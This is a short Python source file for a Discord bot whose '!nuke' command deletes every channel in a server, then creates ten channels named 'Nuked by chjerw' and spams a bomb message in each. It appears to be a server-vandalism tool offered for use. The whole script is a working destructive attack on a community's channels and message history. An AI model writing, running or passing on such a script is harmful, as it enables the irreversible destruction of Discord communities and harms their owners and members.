import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

count = 10
channel_name = "Nuked by chjerw"
channel_message = "💣 Nuked by **chjerw**"

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    for channel in ctx.guild.channels:
        await channel.delete()

    for i in range(count):
        channel = await ctx.guild.create_text_channel(channel_name+f"-{i}")
        await channel.send(channel_message)

bot.run("TOKEN")
